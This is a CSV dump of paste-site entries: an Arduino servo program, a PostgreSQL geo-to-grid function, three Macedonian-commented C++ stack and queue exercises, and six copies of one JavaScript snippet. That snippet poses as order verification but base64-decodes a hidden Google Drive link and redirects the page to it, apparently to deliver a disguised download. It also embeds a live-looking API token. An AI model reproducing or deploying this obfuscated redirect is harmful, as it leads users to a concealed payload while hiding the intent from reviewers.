id,title,username,language,date,content
i1rB68UJ,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:05:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/947/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H3MmeiWp,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:50:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/369/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nHQuJXnU,**Servo Control** rev_01,pleasedontcode,Arduino,Monday 24th of March 2025 04:42:02 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Servo Control**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-03-24 09:40:52

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* make it work */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton
#include <Servo.h>	//https://github.com/arduino-libraries/Servo

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t button_PushButton_PIN_D2 = 2; // Define button pin

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo servo1; // Create servo objects
Servo servo2;
Servo servo3;
Servo servo4;
Servo servo5;
Servo servo6;
Servo servo7;

void setup(void)
{
	// put your setup code here, to run once:
	pinMode(button_PushButton_PIN_D2, INPUT_PULLUP);
	
	// Initialize servos
	servo1.attach(11);
	servo2.attach(10);
	servo3.attach(3);
	servo4.attach(4);
	servo5.attach(5);
	servo6.attach(6);
	servo7.attach(7);
	
	// Set initial positions for servos
	servo1.write(180);
	servo2.write(180);
	servo3.write(180);
	servo4.write(180);
	servo5.write(180);
	servo6.write(180);
	servo7.write(180);
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	int button = digitalRead(button_PushButton_PIN_D2); // Use the defined button pin
	static int buttoncount = 0; // Use static to retain value between calls

	if (button == HIGH) {
		buttoncount += 1; // Increment button count

		if (buttoncount == 1) {
			servo1.write(180);
			servo2.write(180);
			servo3.write(180);
			servo5.write(180);
			servo6.write(180);
		}
		if (buttoncount == 2) {
			servo4.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo3.write(90);
			servo2.write(90);
			servo6.write(180);
		}
		if (buttoncount == 3) {
			servo3.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
		}
		if (buttoncount == 4) {
			servo6.write(90);
			servo5.write(90);
			servo7.write(90);
			servo4.write(90);
			servo1.write(180);
			servo2.write(180);
		}
		if (buttoncount == 5) {
			servo1.write(90);
			servo6.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
			servo7.write(180);
		}
		if (buttoncount == 6) {
			servo3.write(90);
		}
		if (buttoncount == 7) {
			servo7.write(90);
			servo6.write(180);
			servo5.write(180);
			servo2.write(180);
			servo3.write(180);
		}
		if (buttoncount == 8) {
			servo2.write(90);
			servo3.write(90);
			servo5.write(90);
			servo6.write(90);
		}
		if (buttoncount == 9) {
			servo3.write(180);
		}
		if (buttoncount == 10) {
			servo3.write(90);
			servo5.write(180); // Fixed typo from 'ervo5' to 'servo5'
		}
	}
}

/* END CODE */"
uuQaApiR,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:34:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/666/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uYkAKK6q,geo2grid04,aghoshpro,PostgreSQL,Monday 24th of March 2025 04:29:50 AM CDT,"-- FUNCTION: rasdaman_op.geo2grid_final(text, double precision, double precision, double precision, double precision)

CREATE OR REPLACE FUNCTION rasdaman_op.geo2grid_final(
	""geoPOLY"" text,
	min_lon double precision,
	max_lat double precision,
	resolution_lon double precision,
	resolution_lat double precision,
	OUT ""gridPOLY"" text)
    RETURNS text
    LANGUAGE 'plpython3u'
    COST 100
    VOLATILE PARALLEL UNSAFE
AS $BODY$
import numpy as np
import re
from affine import Affine
from shapely.geometry import Polygon, LinearRing, MultiPolygon
from shapely.ops import unary_union
from shapely import wkt

def grid2WKT_ring(y_grid, x_grid):
    coordinates = list(zip(y_grid, x_grid))
    if coordinates[0] != coordinates[-1]:
        coordinates.append(coordinates[0])
    ring_wkt = ""LINEARRING("" + "", "".join(f""{x} {y}"" for x, y in coordinates) + "")""
    return ring_wkt

def grid2WKT_polygon(y_grid, x_grid):
    coordinates = list(zip(y_grid, x_grid))
    if coordinates[0] != coordinates[-1]:
        coordinates.append(coordinates[0])
    polygon_wkt = ""POLYGON(("" + "", "".join(f""{x} {y}"" for x, y in coordinates) + ""))""
    return polygon_wkt

def geo2grid(lons, lats, xmin, ymax, x_scale, y_scale, xskew = 0.0, yskew = 0.0):
    aff_gdal = Affine.from_gdal(xmin, x_scale, xskew, ymax, 0.0, -y_scale)
    lons = np.array(lons)
    lats = np.array(lats)
    xs, ys = ~aff_gdal*(lons, lats)
    xs = np.int64(xs)
    ys = np.int64(ys)
    return xs, ys 

def process_boundary(boundary):
    coords = np.dstack(boundary.xy).tolist()[0]
    coordinates = [{""long"": x, ""lat"": y} for x, y in coords]
    
    lat_arr = []
    long_arr = []
    for coord in coordinates:
        long_arr = np.append(long_arr, coord['long'])
        lat_arr = np.append(lat_arr, coord['lat'])

    long_list = long_arr.tolist()
    lat_list = lat_arr.tolist()

    x_grid, y_grid = geo2grid(long_list, lat_list, xmin, ymax, x_scale, y_scale)
    return x_grid, y_grid

def processPOLYGON(inputPOLYGON):
    if inputPOLYGON.area == 0:
        return None
    
    ext_x_grid, ext_y_grid = process_boundary(inputPOLYGON.exterior)
    
    if len(inputPOLYGON.interiors) == 0:
        gridPOLYGON_wkt = grid2WKT_polygon(ext_y_grid, ext_x_grid)
        return gridPOLYGON_wkt
    
    else:
        ext_coordinates = list(zip(ext_x_grid, ext_y_grid))
        if ext_coordinates[0] != ext_coordinates[-1]:
            ext_x_grid = np.append(ext_x_grid, ext_x_grid[0])
            ext_y_grid = np.append(ext_y_grid, ext_y_grid[0])
            
        rings_wkt = ""POLYGON(("" + "", "".join(f""{x} {y}"" for x, y in zip(ext_x_grid, ext_y_grid)) + "")""
        
        for interior in inputPOLYGON.interiors:
            int_x_grid, int_y_grid = process_boundary(interior)
            unique_points = set(zip(int_x_grid, int_y_grid))
            
            if len(unique_points) >= 3:
                int_coordinates = list(zip(int_x_grid, int_y_grid))
            
                if int_coordinates[0] != int_coordinates[-1]:
                    int_x_grid = np.append(int_x_grid, int_x_grid[0])
                    int_y_grid = np.append(int_y_grid, int_y_grid[0])
                    
                rings_wkt += "", ("" + "", "".join(f""{x} {y}"" for x, y in zip(int_x_grid, int_y_grid)) + "")""
        
        rings_wkt += "")""
        return rings_wkt

def geoPOLYGON_to_gridPOLYGON(inputREGION, min_lon, max_lat, resolution_lon, resolution_lat):
    global xmin, ymax, x_scale, y_scale
    xmin = min_lon
    ymax = max_lat
    x_scale = resolution_lon
    y_scale = resolution_lat
    
    try:
        inputREGION = wkt.loads(inputREGION)
        
        if inputREGION.geom_type == 'Polygon':
            return processPOLYGON(inputREGION)
        
        elif inputREGION.geom_type == 'MultiPolygon':
            polygon_wkts = []
            
            for polygon in inputREGION.geoms:
                grid_polygon = processPOLYGON(polygon)
                if grid_polygon:
                    polygon_wkts.append(grid_polygon)
            
            if not polygon_wkts:
                return None
                
            try:
                grid_polygons = [wkt.loads(poly_wkt) for poly_wkt in polygon_wkts if poly_wkt]
                merged = unary_union(grid_polygons)
                return merged.wkt
            except Exception as e:
                return f""MULTIPOLYGON({','.join([p.replace('POLYGON', '') for p in polygon_wkts])})""
        
        else:
            raise ValueError(f""Unsupported geometry type: {inputREGION.geom_type}"")
    except Exception as e:
        return f""Error: {str(e)}""

gridPOLY = geoPOLYGON_to_gridPOLYGON(geoPOLY, min_lon, max_lat, resolution_lon, resolution_lat)
return gridPOLY
$BODY$;"
V4umZUdA,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:19:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/599/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H2ViN33A,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:04:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/590/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
A8YtKZ7C,Untitled,Josif_tepe,C++,Monday 24th of March 2025 03:52:44 AM CDT,"#include <iostream>
using namespace std;
const int max_size = 1000;
// implementacija na red
struct queue {
    int niza[max_size];
    int S, E;

    void init() {
        S = 0;
        E = -1;
    }

    bool isFull() {
        if(E == max_size - 1) {
            return true;
        }
        else {
            return false;
        }
    }

    bool isEmpty() {
        if(E == -1) {
            return true;
        }
        else {
            return false;
        }
    }
    
    void push(int x) {
        if(isFull() == true) {
            cout << ""redot e poln"" << endl;
            exit(-1);
        }
        E++;
        niza[E] = x;
    }
    int pop() {
        if(isEmpty()) {
            cout << ""redot e prazen"" << endl;
            exit(-1);
        }
        int res = niza[S];

        for(int i = S; i < E; i++) {
            niza[i] = niza[i + 1];
        }
        E--;
        return res;
    }

    int front() { // top(), peek()
        if(isEmpty() == true) {
            cout << ""redot e prazen"" << endl;
            exit(-1);
        }
        return niza[S];
    }

    int size() {
        return E + 1;
    }

};
 // pravime funkcija so 2 argumenti
void promeni(queue & q1, queue & q2) {
    // dodeka ima uste elementi vo q1
    while(q1.isEmpty() == false) {
        // go vadime prviot element
        int c = q1.pop();
        
        // ako ne sme na krajot
        if(q1.isEmpty() == false) {
            int c2 = q1.front();
                // pravime proverka za toa dali zbirot e pogolem ili pomal od 9
            if(c + c2 > 9) {
                q2.push(c);
            }
            else {
                q2.push(c + c2);
            }
        }
    }
}
int main() {
    int broj;
    cin >> broj;

    int prevrten = 0;
    // go prevrtuvame brojot, bidejki queue raboti na princip FIFO
    while(broj > 0) {
        int cifra = broj  % 10;
        prevrten = (prevrten * 10) + cifra;
        broj /= 10;
    }

    queue q;
    q.init();

    queue res;
    res.init();
    // gi vmetnuvame vo q
    while(prevrten > 0) {
        int cifra = prevrten % 10;
        q.push(cifra);
        prevrten /= 10;
    }

    promeni(q, res);
    // go pecatime rezultatot
    while(res.isEmpty() == false) {
        cout << res.pop();
    }
    return 0;
}
"
V6dAMM2T,Untitled,Josif_tepe,C++,Monday 24th of March 2025 03:50:34 AM CDT,"#include <iostream>
using namespace std;
const int max_size = 1000;
// implementacija na stek
struct stack {
    string niza[max_size];
    int idx;

    void init() {
        idx = -1;
    }

    bool isFull() {
        if(idx == max_size - 1) {
            return true;
        }
        else {
            return false;
        }
    }

    bool isEmpty() {
        if(idx == -1) {
            return true;
        }
        else {
            return false;
        }
    }
    void push(string x) {
        if(isFull() == true) {
            cout << ""stekot e poln"" << endl;
            exit(-1);
        }
        idx++;
        niza[idx] = x;
    }

    string pop() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        string res = niza[idx];
        idx--;
        return res;
    }
    string top() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        return niza[idx];
    }

    int size() {
        return idx + 1;
    }
};


int main() {
    cout << ""Vnesi broj na patiki: "" << endl;
    int n;
    cin >> n;

    stack s;
    s.init();
    for(int i = 0; i < n; i++) {
        cout << ""Vnesi patika: "";
        string patika;
        cin >> patika;
            
        // ako nema patiki za sparuvanje, samo ja dodavame momentalnata patika na vrvot
        if(s.isEmpty() == true) {
            s.push(patika);
        }
        else {
            // proveruvame dali momentalnata patika e razlicna so taa na vrvot za da mozhe da gi spoime
            if(s.top() != patika) {
                // ako mozhe, ja trgame od vrvot
                s.pop();
            }
            else {
                // ako ne mozhe, ja stavame na vrvot
                s.push(patika);
            }
        }
    }
    // kolku sto ima patiki vo stackot, tolku nespareni ni ostanuvaat
    cout << s.size() << endl;

    return 0;
}
"
7y2xnhD2,Untitled,x41w,JavaScript,Monday 24th of March 2025 03:48:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/906/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
49s4t5pV,Untitled,Josif_tepe,C++,Monday 24th of March 2025 03:46:52 AM CDT,"#include <iostream>
using namespace std;
const int max_size = 1000;
// implementacija na stack
struct stack {
    int niza[max_size];
    int idx;

    void init() {
        idx = -1;
    }

    bool isFull() {
        if(idx == max_size - 1) {
            return true;
        }
        else {
            return false;
        }
    }

    bool isEmpty() {
        if(idx == -1) {
            return true;
        }
        else {
            return false;
        }
    }
    void push(int x) {
        if(isFull() == true) {
            cout << ""stekot e poln"" << endl;
            exit(-1);
        }
        idx++;
        niza[idx] = x;
    }

    int pop() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        int res = niza[idx];
        idx--;
        return res;
    }
    int top() {
        if(isEmpty() == true) {
            cout << ""stekot e prazen"" << endl;
            exit(-1);
        }
        return niza[idx];
    }

    int size() {
        return idx + 1;
    }
};
// pravime funkcija so argument stack
void promeni(stack &s) {
        // go inicijalizirame
    stack pom1;
    pom1.init();
    

    // gi vadime elementite od stackot, i gi stavame vo pom1
    while(s.isEmpty() == false) {
        pom1.push(s.pop());
    }

    // pravime drug pomosen stack
    stack pom2;
    pom2.init();

    // gi vadime elementite od pom1
    while(pom1.isEmpty() == false) {
        
        // go gledame momentalniot element sto e na vrvot
        int momemtanel = pom1.pop();

        // ako ima elementi vo pom2
        if(pom2.isEmpty() == false) {
            int delitel = pom2.top();
            // proveruvame dali e ispolnet uslovot za delivost
            if(momemtanel % delitel == 0) {
                // go dodavame na s, bidejki s e ispraznet
                s.push(momemtanel / delitel);
            }
        }
        // go zacuvuvame kako prethodnik vo pom2
        pom2.push(momemtanel);

        // proveruvame dali ne sme na posledniot elemenet
        if(pom1.isEmpty() == false) {
            // istata proverka za delivost
            int sleden = pom1.top();
            if(momemtanel % sleden == 0) {
                s.push(momemtanel / sleden);
            }
        }
    }
// go pecatime krajniot rezultat
    while(s.isEmpty() == false) {
        cout << s.pop() << "" "";
    }

}

int main() {
    // kod daden od samata zadaca
   stack m1;

    m1.init();

    m1.push(2);
    m1.push(10);
    m1.push(5);
    m1.push(2);
    m1.push(1);

    promeni(m1);

    while (!m1.isEmpty()) {
        cout << m1.pop() << endl;
    }

    return 0;
}
"
